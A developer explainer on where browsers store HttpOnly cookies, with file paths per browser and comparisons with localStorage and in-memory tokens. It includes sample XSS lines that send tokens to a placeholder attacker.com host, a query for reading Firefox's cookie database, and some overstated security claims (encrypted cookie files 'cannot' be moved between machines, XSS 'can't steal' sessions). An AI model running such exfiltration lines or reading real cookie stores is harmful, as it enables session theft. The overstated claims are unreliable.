# Where Are HttpOnly Cookies Actually Stored? Deep Dive

## Quick Answer

**HttpOnly cookies are stored in the browser's cookie storage**, but in a **protected location that JavaScript CANNOT access**. The browser manages them separately from JavaScript-accessible storage.

---

## The Storage Hierarchy

```
┌─────────────────────────────────────────────────────────────────┐
│                         Operating System                        │
│                    (Windows, macOS, Linux)                      │
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │              File System / Storage Device                │  │
│  │                                                          │  │
│  │  ┌─ Browser Application Folder                         │  │
│  │  │  (e.g., ~/Library/Application Support/Google/Chrome)│  │
│  │  │                                                      │  │
│  │  │  ┌─ Cookies Folder (HttpOnly Cookies stored here)  │  │
│  │  │  │  ├─ Cookies.db (SQLite database)               │  │
│  │  │  │  └─ Encrypted in production browsers           │  │
│  │  │  │                                                  │  │
│  │  │  ├─ Storage Folder (localStorage, sessionStorage)  │  │
│  │  │  │  └─ Accessible to JavaScript                   │  │
│  │  │  │                                                  │  │
│  │  │  ├─ Cache Folder                                   │  │
│  │  │  │                                                  │  │
│  │  │  └─ ... other browser data                         │  │
│  │  │                                                      │  │
│  └────────────────────────────────────────────────────────┘  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## Browser-Level Storage Locations

### Chrome / Chromium

**On Windows:**
```
C:\Users\[Username]\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies
```

**On macOS:**
```
~/Library/Application Support/Google/Chrome/Default/Cookies
```

**On Linux:**
```
~/.config/google-chrome/Default/Cookies
```

**Storage Format:**
- SQLite database file named `Cookies` (no extension)
- Contains all cookies (both HttpOnly and regular)
- Encrypted (v12 and later of Chrome)

**File Structure:**
```
Cookies (SQLite Database)
├── host_key (domain)
├── name (cookie name)
├── value (cookie value) ← ENCRYPTED
├── creation_utc (timestamp)
├── last_accessed_utc (timestamp)
├── expires_utc (expiration)
├── secure (HTTPS only flag)
├── httponly (JavaScript inaccessible flag) ← THIS MARKS IT
├── samesite (CSRF protection)
├── top_frame_site_key
└── encrypted (1 = encrypted, 0 = plaintext)
```

### Firefox

**On Windows:**
```
C:\Users\[Username]\AppData\Roaming\Mozilla\Firefox\Profiles\[ProfileID]\cookies.sqlite
```

**On macOS:**
```
~/Library/Application Support/Firefox/Profiles/[ProfileID]/cookies.sqlite
```

**On Linux:**
```
~/.mozilla/firefox/[ProfileID]/cookies.sqlite
```

**Storage Format:**
- SQLite database file `cookies.sqlite`
- Contains all cookies with metadata

### Safari

**On macOS:**
```
~/Library/Cookies/Cookies.binarycookies
```

**On iOS:**
```
(System-managed, not directly accessible)
```

**Storage Format:**
- Binary format (not human-readable)
- System-protected

### Edge, Opera, Brave (Chromium-based)

All use similar structure to Chrome since they're based on Chromium:
- `User Data/Default/Network/Cookies` or similar
- SQLite database format
- Same encryption as Chrome

---

## How HttpOnly Flag Works

### What the HttpOnly Flag Does

```
Server sends:
Set-Cookie: refresh_token=abc123; HttpOnly; Secure; SameSite=Strict

Browser receives and stores:
┌──────────────────────────────────────────────────┐
│ Cookie Storage                                   │
├──────────────────────────────────────────────────┤
│ Name: refresh_token                              │
│ Value: abc123                                    │
│ HttpOnly: TRUE ← The JavaScript blocker         │
│ Secure: TRUE                                     │
│ SameSite: Strict                                 │
└──────────────────────────────────────────────────┘
```

### JavaScript Cannot Access HttpOnly Cookies

```javascript
// ❌ This will NOT work
console.log(document.cookie);
// Output: (empty if all cookies are HttpOnly)

// ❌ This will NOT work
const cookies = document.cookie.split(';');
// If refresh_token is HttpOnly, it won't appear here

// ❌ This will NOT work even with XSS
const refreshToken = localStorage.getItem('refresh_token');
// If it's in a cookie, this returns null
```

### Browser Enforces the Block

```
JavaScript Code Execution
           ↓
    ┌─────────────────────┐
    │ document.cookie     │
    │ cookie access API   │
    └──────────┬──────────┘
               ↓
    ┌─────────────────────────────────────┐
    │ Browser's Cookie Manager            │
    │                                     │
    │ Check: Is this httpOnly = true?     │
    │                                     │
    │ if (httpOnly) {                     │
    │   BLOCK access ❌                   │
    │ }                                   │
    └─────────────────────────────────────┘
```

---

## Detailed Comparison: Storage Methods

### 1. localStorage (JavaScript Accessible)

**Location:**
- Chrome: `User Data/Default/Local Storage/`
- Firefox: `profile/storage/default/`
- Safari: `~/Library/Safari/LocalStorage/`

**Storage Format:**
```
File: https_myapp.com_0.localstorage (JSON or custom format)

Contents:
{
  "access_token": "eyJhbGc...",    ← JavaScript can read
  "user_id": "12345"               ← Visible to any code on page
}
```

**Accessibility:**
```javascript
// ✅ JavaScript CAN access
const token = localStorage.getItem('access_token');

// ✅ XSS can steal it
fetch('https://attacker.com/steal?token=' + token);
```

**Security:**
```
Attacker injects XSS → Reads localStorage → Steals tokens ❌
```

---

### 2. sessionStorage (JavaScript Accessible)

**Location:**
- Similar to localStorage, per-browser-session
- Chrome: `User Data/Default/Local Storage/`

**Difference from localStorage:**
- Cleared when tab closes
- Still vulnerable to XSS on the same page

**Accessibility:**
```javascript
// ✅ JavaScript CAN access
const token = sessionStorage.getItem('access_token');

// ✅ XSS on same page can steal it
fetch('https://attacker.com/steal?token=' + token);
```

---

### 3. Memory (JavaScript Variable)

**Location:**
- Stored in RAM (process memory)
- Not persisted to disk

**Example:**
```javascript
let accessToken = "eyJhbGc...";  // Lives in RAM

// Later:
const token = accessToken;  // Can access in same execution context
```

**Storage Details:**
```
Browser Process (Memory)
│
├── Global Variables
│   └── accessToken = "eyJhbGc..."  ← In RAM, lost on refresh
│
├── Function Scope
├── Closure Variables
└── etc.

When page refreshes: Everything cleared from memory
```

**Security:**
```
Same-page XSS can still access it ⚠️
But different tab/window/process can't access it
Lost on page refresh (bad UX)
```

---

### 4. HttpOnly Cookies (Browser Managed, JS CANNOT Access)

**Location:**
```
Browser's Internal Cookie Database
├── Chrome: User Data/Default/Network/Cookies (SQLite, encrypted)
├── Firefox: Profiles/[ID]/cookies.sqlite (SQLite)
├── Safari: ~/Library/Cookies/Cookies.binarycookies
└── Edge: User Data/Default/Network/Cookies
```

**Storage Format - Chrome Example:**

```sqlite
-- Cookies.db (SQLite database)

CREATE TABLE cookies (
  creation_utc INTEGER,
  top_frame_site_key TEXT,
  host_key TEXT,           -- ".myapp.com"
  name TEXT,               -- "refresh_token"
  value BLOB,              -- ENCRYPTED blob containing token
  encrypted_value BLOB,    -- For encrypted storage
  path TEXT,               -- "/"
  expires_utc INTEGER,     -- expiration timestamp
  is_secure INTEGER,       -- 1 = HTTPS only
  is_httponly INTEGER,     -- 1 = JavaScript blocked ✓
  is_samesite INTEGER,     -- CSRF protection level
  samesite_mode INTEGER,   -- 0=None, 1=Lax, 2=Strict
  is_persistent INTEGER,   -- 1 = persisted across restarts
  priority INTEGER,        -- cookie priority
  ...
);
```

**How It's Protected:**

```
┌─────────────────────────────────────────────────────┐
│ Browser Process (Chrome)                            │
│                                                     │
│ ┌──────────────────┐        ┌─────────────────┐   │
│ │ JavaScript Code  │        │ Cookie Manager  │   │
│ │                  │        │ (C++ Code)      │   │
│ │ document.cookie  │───────→│ if (httpOnly) { │   │
│ │                  │        │   BLOCK ❌      │   │
│ │                  │        │ }               │   │
│ │                  │        └─────────────────┘   │
│ │                  │              ↓               │
│ │                  │        ┌──────────────────┐  │
│ │                  │        │ Cookie Database  │  │
│ │                  │        │ (Encrypted)      │  │
│ │                  │        └──────────────────┘  │
│ └──────────────────┘                              │
│                                                     │
│ HTTP Server Code                                  │
│ (Set-Cookie header, XHR/Fetch)                    │
│        ↓                                           │
│ ┌──────────────────────────────────┐             │
│ │ Cookie Manager                   │             │
│ │ ✓ Can read/write HttpOnly        │             │
│ │ ✓ Automatic inclusion in         │             │
│ │   fetch/XHR with credentials     │             │
│ └──────────────────────────────────┘             │
│        ↓                                           │
│ ┌──────────────────────────────────┐             │
│ │ Network Request                  │             │
│ │ Cookie: refresh_token=abc123     │ ← Auto sent │
│ └──────────────────────────────────┘             │
│                                                     │
└─────────────────────────────────────────────────────┘
```

**JavaScript CANNOT Access:**

```javascript
// ❌ BLOCKED - JavaScript can't see HttpOnly cookies
console.log(document.cookie);
// If all cookies are HttpOnly, outputs: ""

// ❌ BLOCKED - Can't enumerate HttpOnly cookies
const allCookies = document.cookie.split(';');
// HttpOnly cookies won't be in the list

// ❌ BLOCKED - Can't steal refresh_token
const refreshToken = document.cookie.match(/refresh_token=([^;]*)/);
// Returns null if refresh_token is HttpOnly

// ❌ BLOCKED - Even with XSS
fetch('https://attacker.com?token=' + document.cookie);
// Only sends non-HttpOnly cookies
```

**Browser Automatically Includes It in Requests:**

```javascript
// ✅ Browser automatically sends HttpOnly cookie
fetch('/api/refresh', {
  credentials: 'include'  // Include cookies (both HttpOnly and regular)
})
// Browser adds to headers:
// Cookie: refresh_token=abc123 (even though JS can't see it)

// ✅ Same with XMLHttpRequest
const xhr = new XMLHttpRequest();
xhr.withCredentials = true;  // Include cookies
xhr.open('POST', '/api/refresh');
xhr.send();
// Browser includes refresh_token cookie automatically
```

---

## Real-World File Examples

### Chrome Cookie Database (macOS)

**File path:**
```
~/Library/Application Support/Google/Chrome/Default/Network/Cookies
```

**What you'd see if you opened it with SQLite viewer:**

```sqlite
CREATE TABLE cookies (
  ...
);

INSERT INTO cookies VALUES (
  13292304000000,              -- creation_utc
  'https_myapp.com_0',         -- top_frame_site_key
  '.myapp.com',                -- host_key (domain)
  'refresh_token',             -- name
  NULL,                        -- value (NULL means encrypted)
  X'08C9F2...',                -- encrypted_value (actual encrypted bytes)
  '/',                         -- path
  13300000000000,              -- expires_utc (1 week from now)
  1,                           -- is_secure (HTTPS only)
  1,                           -- is_httponly (CANNOT ACCESS FROM JS) ← HERE
  2,                           -- is_samesite
  2,                           -- samesite_mode (2 = Strict)
  1,                           -- is_persistent
  1,                           -- priority
  ...
);
```

### Firefox Cookie Database (Linux)

**File path:**
```
~/.mozilla/firefox/[ProfileID]/cookies.sqlite
```

**Query the database:**

```bash
sqlite3 ~/.mozilla/firefox/[ProfileID]/cookies.sqlite
```

**View cookies:**

```sql
SELECT host, name, value, isSecure, isHttpOnly FROM moz_cookies 
WHERE host = '.myapp.com';
```

**Output:**
```
host        | name           | value              | isSecure | isHttpOnly
------------|----------------|--------------------|---------|-----------
.myapp.com  | refresh_token  | abc123def456...    | 1       | 1
.myapp.com  | session_id     | xyz789...          | 1       | 0
google.com  | other_cookie   | value              | 0       | 0
```

---

## How Browser Encryption Works

### Chrome Cookie Encryption (Chromium v12+)

**For Windows (DPAPI):**

```
Plaintext Cookie Value
        ↓
    ┌───────────────────┐
    │ Encryption Engine │
    │ Uses Windows DPAPI│
    │ (per-user key)    │
    └────────┬──────────┘
             ↓
    Encrypted Binary Blob
    ├─ Stored in SQLite
    ├─ Only decryptable by same user
    ├─ Only decryptable on same machine
    └─ Only decryptable in same browser profile
```

**For macOS (libsecret/Keychain):**

```
Plaintext Cookie Value
        ↓
    ┌──────────────────────┐
    │ Keychain Integration │
    │ (system-level key)   │
    └────────┬─────────────┘
             ↓
    Encrypted Binary Blob
    ├─ Stored in SQLite
    ├─ Protected by Keychain
    ├─ Can require biometric auth
    └─ Isolated per user
```

**For Linux (Secret Service):**

```
Plaintext Cookie Value
        ↓
    ┌──────────────────────┐
    │ Secret Service API   │
    │ (system daemon)      │
    └────────┬─────────────┘
             ↓
    Encrypted Binary Blob
    ├─ Stored in SQLite
    ├─ Protected by local key
    └─ Isolated to user account
```

### Encryption in Transit

```
Browser → HTTPS → Server

1. Cookie set by server:
   Set-Cookie: refresh_token=abc123; HttpOnly; Secure
   
2. Browser stores encrypted in disk
   
3. When browser needs to send cookie:
   ├─ Retrieve from encrypted storage
   ├─ Decrypt using OS-provided key
   ├─ Add to HTTPS request
   └─ TLS encrypts for transmission
   
4. Server receives over HTTPS
   HTTPS decryption → Cookie header
```

---

## Threat Scenarios and Protection

### Scenario 1: XSS Attack on localStorage

```
Attacker injects: <script>fetch('https://attacker.com?t=' + localStorage.access_token)</script>

localStorage storage:
  access_token: "eyJhbGc..." ← VISIBLE TO JAVASCRIPT

Result: ❌ Token stolen
```

### Scenario 2: XSS Attack with HttpOnly Cookies

```
Attacker injects: <script>fetch('https://attacker.com?t=' + document.cookie)</script>

Cookie storage:
  refresh_token: "abc123" (HttpOnly: true) ← BLOCKED FROM JAVASCRIPT
  access_token: "eyJhbGc..." (HttpOnly: true) ← BLOCKED FROM JAVASCRIPT

Attacker's code receives:
  document.cookie = ""  // Empty!
  
Browser still sends cookie in requests:
  fetch('/api/refresh', {credentials: 'include'})
  // Browser adds: Cookie: refresh_token=abc123 (automatic)
  
Result: ✅ Refresh token protected
         ✅ XSS can't steal it
         ✅ Automatic inclusion in requests
```

### Scenario 3: Local Disk Access

```
Attacker gains access to file system (malware, etc)

localStorage file: ~/.[browser-profile]/localStorage/
  ├─ Human-readable JSON
  ├─ Can copy and read
  └─ Tokens immediately accessible ❌

HttpOnly cookie database: ~/.[browser-profile]/Cookies
  ├─ SQLite database
  ├─ Encrypted with OS-level key
  ├─ Can only decrypt on same machine/user
  └─ Cross-machine transfer impossible ✅
```

---

## Summary: Storage Locations by Browser

| Browser | Cookie Location | Format | Encryption |
|---------|---|---|---|
| **Chrome (Windows)** | `AppData\Local\Google\Chrome\...\Network\Cookies` | SQLite | DPAPI (Yes) |
| **Chrome (macOS)** | `~/Library/.../Chrome/Default/Network/Cookies` | SQLite | Keychain (Yes) |
| **Chrome (Linux)** | `~/.config/google-chrome/Default/Network/Cookies` | SQLite | SecretService (Yes) |
| **Firefox (All)** | `Profiles/[ID]/cookies.sqlite` | SQLite | Optional |
| **Safari (macOS)** | `~/Library/Cookies/Cookies.binarycookies` | Binary | Yes |
| **Safari (iOS)** | System-managed | Binary | Yes (secure enclave) |
| **Edge (Windows)** | `User Data\Default\Network\Cookies` | SQLite | DPAPI (Yes) |

---

## JavaScript Storage Comparison

| Storage | Location | Format | Encrypted | JS Access | Persistence |
|---------|----------|--------|-----------|-----------|-------------|
| **localStorage** | `Local Storage/` | JSON/text | No | ✅ Yes | ✅ Yes |
| **sessionStorage** | `Session Storage/` | JSON/text | No | ✅ Yes | ❌ No |
| **Memory variable** | RAM only | RAM object | N/A | ✅ Yes | ❌ No |
| **HttpOnly Cookie** | `Cookies DB` | SQLite (encrypted) | ✅ Yes | ❌ No | ✅ Yes |
| **Regular Cookie** | `Cookies DB` | SQLite | Optional | ✅ Yes | ✅ Yes |

---

## Best Practice: The Hybrid Approach

### What to Store Where

```
┌──────────────────────────────────────────────────────┐
│ STORE IN HTTPONOLY COOKIE                            │
├──────────────────────────────────────────────────────┤
│ ✓ Refresh Token (long-lived, 7 days)                │
│ ✓ Session ID (persistent auth identifier)           │
│ ✓ CSRF token (if using old CSRF approach)           │
│ ✓ Any sensitive, long-lived credential              │
└──────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────┐
│ STORE IN MEMORY (React state, variable)             │
├──────────────────────────────────────────────────────┤
│ ✓ Access Token (short-lived, 5-15 minutes)          │
│ ✓ User profile data (name, email, etc)              │
│ ✓ UI state (loading, error, etc)                    │
│ ✓ Authorization state                               │
└──────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────┐
│ NEVER STORE                                          │
├──────────────────────────────────────────────────────┤
│ ✗ localStorage - Too vulnerable to XSS              │
│ ✗ sessionStorage - Same risks as localStorage       │
│ ✗ Regular (non-HttpOnly) cookies - JS accessible    │
│ ✗ Any token in URL parameters                       │
│ ✗ Passwords or secrets                              │
└──────────────────────────────────────────────────────┘
```

---

## Summary

**Where are HttpOnly cookies stored?**

1. **Physically**: In the browser's cookie database file on disk
   - Chrome: `User Data/Default/Network/Cookies`
   - Firefox: `profiles/[id]/cookies.sqlite`
   - Safari: `~/Library/Cookies/Cookies.binarycookies`

2. **Logically**: In a protected storage managed by the browser
   - Not accessible to JavaScript
   - Encrypted by OS-level mechanisms
   - Automatically included in HTTP requests

3. **Security**: 
   - File is encrypted (DPAPI, Keychain, SecretService)
   - JavaScript is blocked from accessing
   - XSS can't steal them
   - Survives page refresh

**Why HttpOnly is better than localStorage:**
- **localStorage**: Plain text files on disk, JavaScript can read
- **HttpOnly Cookie**: Encrypted files on disk, JavaScript blocked by browser, auto-included in requests

This is why modern secure applications use **HttpOnly cookies for refresh tokens** and **memory for access tokens**—the best of both security and usability.
